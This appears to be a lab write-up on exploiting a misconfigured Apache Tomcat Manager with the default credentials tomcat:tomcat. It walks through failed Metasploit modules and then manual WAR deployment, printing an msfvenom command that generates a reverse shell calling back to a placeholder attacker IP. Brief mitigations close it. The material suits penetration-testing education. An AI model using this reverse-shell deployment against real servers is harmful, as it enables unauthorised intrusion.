# Apache Tomcat Exploitation: From Automated Failure to Manual Success

## Project Overview
This project documents the exploitation of a misconfigured Apache Tomcat server (Port 8180). The goal was to achieve Remote Code Execution (RCE). This report highlights the troubleshooting process where automated Metasploit modules failed due to persistence bugs, leading to a successful manual exploitation via WAR file deployment.

## Phase 1: Automated Attempts & Troubleshooting
Initially, standard Metasploit modules were used. Several technical hurdles were encountered and analyzed.

**Attempt 1: Authentication Issues**
* **Module:** `exploit/multi/http/tomcat_mgr_upload`
* **Error:** "Unable to access the Tomcat Manager".
* **Resolution:** Identified and configured correct target credentials (`tomcat:tomcat`).

**Attempt 2: Payload Compatibility**
* **Error:** `ArgumentError wrong number of arguments` using the `jsp_shell` payload.
* **Resolution:** Switched to standard `java/shell/reverse_tcp`.

**Attempt 3: The "Undeploy" Persistence Bug**
* **Module:** Both `tomcat_mgr_upload` and `tomcat_mgr_deploy`.
* **Issue:** The exploits successfully executed the payload but immediately removed the file ("Undeploying..."), causing the reverse shell connection to drop instantly.
* **Failure Analysis:** Attempts to disable this behavior via `set Undeploy false` failed because the specific module version did not support/recognize the option, rendering automated persistence impossible.

## Phase 2: Manual Exploitation (The Solution)
To bypass the limitations of the automated tools, a manual methodology was adopted to ensure the malicious file remained on the server long enough to establish a connection.

### Step 1: Payload Generation
A raw malicious WAR file was generated using `msfvenom`.
* **Command:** `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f war > shell.war`

### Step 2: Listener Configuration
Metasploit was configured solely as a listener to catch the incoming connection, bypassing the faulty exploit logic.
* **Module:** `exploit/multi/handler`
* **Payload:** `java/jsp_shell_reverse_tcp`

### Step 3: Manual Deployment
Using Firefox, the generated `shell.war` was uploaded directly via the Tomcat Manager HTML interface using the credentials `tomcat:tomcat`.

<img width="958" height="767" alt="tomcat" src="https://github.com/user-attachments/assets/ec5b5634-dc3e-400a-9d3f-01521ad7de85" />


### Step 4: Execution
Clicking the deployed `/shell` application in the browser triggered the payload. Since no automated cleanup script was involved, the connection remained stable.

**Proof of Concept:**
* **Access Level:** `tomcat55` (Service User)

<img width="650" height="516" alt="tomcat-terminal" src="https://github.com/user-attachments/assets/54277aa1-ca96-4059-836b-c70bf3ba8008" />


## Mitigation
1. **Disable Manager App:** Remove the management interface if not required.
2. **Rename WAR files:** Monitor logs for suspicious filenames.
3. **Restrict Access:** Limit access to port 8180/Manager to internal admin IPs only.

## Disclaimer
This project is intended for educational purposes only.
